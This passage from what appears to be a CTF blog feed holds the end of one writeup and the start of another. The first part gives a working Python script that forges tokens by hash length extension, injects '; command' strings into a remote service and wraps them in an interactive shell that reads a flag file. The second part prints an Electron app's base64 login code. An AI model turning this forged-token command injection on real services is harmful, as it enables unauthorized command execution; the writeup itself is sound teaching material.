&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_output&lt;/span>(token, command):
r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#39;144.217.73.235&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">27099&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>recvuntil(ID_HASH &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>sendline(command &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;|&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> token&lt;span style="color:#f92672">.&lt;/span>encode())
data &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvall()
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Bad Token&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> data:
&lt;span style="color:#66d9ef">return&lt;/span> None
&lt;span style="color:#66d9ef">return&lt;/span> data
&lt;span style="color:#66d9ef">for&lt;/span> key_len &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">100&lt;/span>):
&lt;span style="color:#75715e"># Could also have used the `ls` hash.&lt;/span>
token, command &lt;span style="color:#f92672">=&lt;/span> hashpumpy&lt;span style="color:#f92672">.&lt;/span>hashpump(ID_HASH, &lt;span style="color:#e6db74">&amp;#39;id&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39; ; echo 1&amp;#39;&lt;/span>, key_len)
output &lt;span style="color:#f92672">=&lt;/span> get_output(token, command)
&lt;span style="color:#66d9ef">if&lt;/span> output:
&lt;span style="color:#66d9ef">print&lt;/span>(key_len, &lt;span style="color:#e6db74">&amp;#39;OK&amp;#39;&lt;/span>, output)
&lt;span style="color:#66d9ef">break&lt;/span>
&lt;span style="color:#66d9ef">else&lt;/span>:
&lt;span style="color:#66d9ef">print&lt;/span>(key_len, &lt;span style="color:#e6db74">&amp;#39;FAIL&amp;#39;&lt;/span>)
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python fuzz.py
&lt;span style="color:#ae81ff">0&lt;/span> FAIL
&lt;span style="color:#ae81ff">1&lt;/span> FAIL
&lt;span style="color:#ae81ff">2&lt;/span> FAIL
&lt;span style="color:#ae81ff">3&lt;/span> FAIL
&lt;span style="color:#ae81ff">4&lt;/span> FAIL
&lt;span style="color:#ae81ff">5&lt;/span> FAIL
&lt;span style="color:#ae81ff">6&lt;/span> FAIL
&lt;span style="color:#ae81ff">7&lt;/span> FAIL
&lt;span style="color:#ae81ff">8&lt;/span> FAIL
&lt;span style="color:#ae81ff">9&lt;/span> FAIL
&lt;span style="color:#ae81ff">10&lt;/span> FAIL
&lt;span style="color:#ae81ff">11&lt;/span> FAIL
&lt;span style="color:#ae81ff">12&lt;/span> FAIL
&lt;span style="color:#ae81ff">13&lt;/span> FAIL
&lt;span style="color:#ae81ff">14&lt;/span> FAIL
&lt;span style="color:#ae81ff">15&lt;/span> FAIL
&lt;span style="color:#ae81ff">16&lt;/span> FAIL
&lt;span style="color:#ae81ff">17&lt;/span> FAIL
&lt;span style="color:#ae81ff">18&lt;/span> FAIL
&lt;span style="color:#ae81ff">19&lt;/span> FAIL
&lt;span style="color:#ae81ff">20&lt;/span> FAIL
&lt;span style="color:#ae81ff">21&lt;/span> FAIL
&lt;span style="color:#ae81ff">22&lt;/span> OK b&lt;span style="color:#e6db74">&amp;#39;\nuid=1000(ctf) gid=1000(ctf) groups=1000(ctf)\n1\n&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>As we can see, we successfully injected our &lt;code>echo 1&lt;/code> command. We get its output right after the output of the &lt;code>id&lt;/code> command.&lt;/p>
&lt;p>We can now build ourselves a simple shell:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># To remove pesky warnings ; https://stackoverflow.com/a/879249/6262617&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> warnings
warnings&lt;span style="color:#f92672">.&lt;/span>filterwarnings(&lt;span style="color:#e6db74">&amp;#34;ignore&amp;#34;&lt;/span>, category&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">DeprecationWarning&lt;/span>)
&lt;span style="color:#f92672">import&lt;/span> hashpumpy
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;span style="color:#75715e"># To remove remote(...) logs&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ERROR&amp;#39;&lt;/span>
ID_HASH &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a&amp;#39;&lt;/span>
KEY_LEN &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">22&lt;/span>
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_output&lt;/span>(token, command):
r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#39;144.217.73.235&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">27099&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>recvuntil(ID_HASH &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>sendline(command &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;|&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> token&lt;span style="color:#f92672">.&lt;/span>encode())
data &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvall()
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Bad Token&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> data:
&lt;span style="color:#66d9ef">return&lt;/span> None
&lt;span style="color:#66d9ef">return&lt;/span> data
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">inject_command&lt;/span>(command):
injected_command &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#e6db74">&amp;#39;; {command}&amp;#39;&lt;/span>
token, command &lt;span style="color:#f92672">=&lt;/span> hashpumpy&lt;span style="color:#f92672">.&lt;/span>hashpump(ID_HASH, &lt;span style="color:#e6db74">&amp;#39;id&amp;#39;&lt;/span>, injected_command, KEY_LEN)
output &lt;span style="color:#f92672">=&lt;/span> get_output(token, command)
output &lt;span style="color:#f92672">=&lt;/span> output&lt;span style="color:#f92672">.&lt;/span>decode()&lt;span style="color:#f92672">.&lt;/span>strip()
&lt;span style="color:#75715e"># Remove original &amp;#39;id&amp;#39; output&lt;/span>
output &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(output&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">1&lt;/span>:])
&lt;span style="color:#66d9ef">return&lt;/span> output
&lt;span style="color:#66d9ef">while&lt;/span> True:
&lt;span style="color:#66d9ef">try&lt;/span>:
cmd &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#39;$ &amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>strip()
&lt;span style="color:#66d9ef">except&lt;/span>:
&lt;span style="color:#66d9ef">break&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> cmd:
&lt;span style="color:#66d9ef">break&lt;/span>
&lt;span style="color:#66d9ef">print&lt;/span>(inject_command(cmd))
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python demo.py
$ whoami
ctf
$ cat /home/ctf/flag.txt
CYBERTF&lt;span style="color:#f92672">{&lt;/span>HM@C_Custom_Is_Bad_Idea&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here we go, the flag is &lt;code>CYBERTF{HM@C_Custom_Is_Bad_Idea}&lt;/code>.&lt;/p>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/crypto/strange-administration-service">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Smasher</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-smasher/</link><pubDate>Sat, 10 Jul 2021 02:50:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-smasher/</guid><description>For this challenge, we were given two files:
smasher-1.0.0.AppImage smasher_Setup_1.0.0.exe I only looked at the AppImage one, since I&amp;rsquo;m running linux. Launching the program reveals an electron app:
We can simply use the dev tools to reveal the source code. Only one javascript file is there, login.js:
function Login() { var i = { _keyStr: &amp;#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&amp;#34;, encode: function(r) { var t, e, o, a, n, c, h = &amp;#34;&amp;#34;, d = 0; for (r = i.</description><content>&lt;p>For this challenge, we were given two files:&lt;/p>
&lt;ul>
&lt;li>&lt;code>smasher-1.0.0.AppImage&lt;/code>&lt;/li>
&lt;li>&lt;code>smasher_Setup_1.0.0.exe&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>I only looked at the AppImage one, since I&amp;rsquo;m running linux. Launching the program reveals an electron app:&lt;/p>
&lt;p>&lt;img src="https://nicolasb.fr/assets/cyber-threat-force/smasher.png" alt="The application">&lt;/p>
&lt;p>We can simply use the dev tools to reveal the source code. Only one javascript file is there, &lt;code>login.js&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">Login&lt;/span>() {
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {
&lt;span style="color:#a6e22e">_keyStr&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&amp;#34;&lt;/span>,
&lt;span style="color:#a6e22e">encode&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>) {
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">t&lt;/span>, &lt;span style="color:#a6e22e">e&lt;/span>, &lt;span style="color:#a6e22e">o&lt;/span>, &lt;span style="color:#a6e22e">a&lt;/span>, &lt;span style="color:#a6e22e">n&lt;/span>, &lt;span style="color:#a6e22e">c&lt;/span>, &lt;span style="color:#a6e22e">h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">d&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#a6e22e">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span>.&lt;span style="color:#a6e22e">_utf8_encode&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>); &lt;span style="color:#a6e22e">d&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span>; )
&lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charCodeAt&lt;/span>(&lt;span style="color:#a6e22e">d&lt;/span>&lt;span style="color:#f92672">++&lt;/span>)) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>,
&lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">c&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">|&lt;/span> (&lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charCodeAt&lt;/span>(&lt;span style="color:#a6e22e">d&lt;/span>&lt;span style="color:#f92672">++&lt;/span>)) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>,
&lt;span style="color:#a6e22e">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">t&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">|&lt;/span> (&lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charCodeAt&lt;/span>(&lt;span style="color:#a6e22e">d&lt;/span>&lt;span style="color:#f92672">++&lt;/span>)) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>,
&lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">63&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">e&lt;/span>,
isNaN(&lt;span style="color:#a6e22e">t&lt;/span>) &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#a6e22e">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">64&lt;/span> &lt;span style="color:#f92672">:&lt;/span> isNaN(&lt;span style="color:#a6e22e">e&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">64&lt;/span>),
&lt;span style="color:#a6e22e">h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">h&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_keyStr&lt;/span>.&lt;span style="color:#a6e22e">charAt&lt;/span>(&lt;span style="color:#a6e22e">o&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_keyStr&lt;/span>.&lt;span style="color:#a6e22e">charAt&lt;/span>(&lt;span style="color:#a6e22e">a&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_keyStr&lt;/span>.&lt;span style="color:#a6e22e">charAt&lt;/span>(&lt;span style="color:#a6e22e">n&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_keyStr&lt;/span>.&lt;span style="color:#a6e22e">charAt&lt;/span>(&lt;span style="color:#a6e22e">c&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">h&lt;/span>
},
&lt;span style="color:#a6e22e">decode&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>) {
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">t&lt;/span>, &lt;span style="color:#a6e22e">e&lt;/span>, &lt;span style="color:#a6e22e">o&lt;/span>, &lt;span style="color:#a6e22e">a&lt;/span>, &lt;span style="color:#a6e22e">n&lt;/span>, &lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#a6e22e">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">replace&lt;/span>(&lt;span style="color:#e6db74">/[^A-Za-z0-9\+\/\=]/g&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>); &lt;span style="color:#a6e22e">h&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span>; )
&lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_keyStr&lt;/span>.&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charAt&lt;/span>(&lt;span style="color:#a6e22e">h&lt;/span>&lt;span style="color:#f92672">++&lt;/span>)) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">|&lt;/span> (&lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_keyStr&lt;/span>.&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charAt&lt;/span>(&lt;span style="color:#a6e22e">h&lt;/span>&lt;span style="color:#f92672">++&lt;/span>))) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>,
&lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">|&lt;/span> (&lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_keyStr&lt;/span>.&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charAt&lt;/span>(&lt;span style="color:#a6e22e">h&lt;/span>&lt;span style="color:#f92672">++&lt;/span>))) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>,
&lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">a&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#f92672">|&lt;/span> (&lt;span style="color:#a6e22e">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_keyStr&lt;/span>.&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charAt&lt;/span>(&lt;span style="color:#a6e22e">h&lt;/span>&lt;span style="color:#f92672">++&lt;/span>))),
&lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#a6e22e">t&lt;/span>),
&lt;span style="color:#ae81ff">64&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#a6e22e">e&lt;/span>)),
&lt;span style="color:#ae81ff">64&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#a6e22e">n&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#a6e22e">o&lt;/span>));
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span>.&lt;span style="color:#a6e22e">_utf8_decode&lt;/span>(&lt;span style="color:#a6e22e">c&lt;/span>)
},
&lt;span style="color:#a6e22e">_utf8_encode&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>) {
&lt;span style="color:#a6e22e">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">replace&lt;/span>(&lt;span style="color:#e6db74">/\r\n/g&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;\n&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span>; &lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">++&lt;/span>) {
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charCodeAt&lt;/span>(&lt;span style="color:#a6e22e">e&lt;/span>);
&lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#a6e22e">o&lt;/span>) &lt;span style="color:#f92672">:&lt;/span> (&lt;span style="color:#ae81ff">127&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2048&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">192&lt;/span>) &lt;span style="color:#f92672">:&lt;/span> (&lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">224&lt;/span>),
&lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">63&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span>)),
&lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#ae81ff">63&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span>))
}
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">t&lt;/span>
},
&lt;span style="color:#a6e22e">_utf8_decode&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>) {
&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">c1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">c2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span>; )
(&lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charCodeAt&lt;/span>(&lt;span style="color:#a6e22e">e&lt;/span>)) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span> &lt;span style="color:#f92672">?&lt;/span> (&lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#a6e22e">o&lt;/span>),
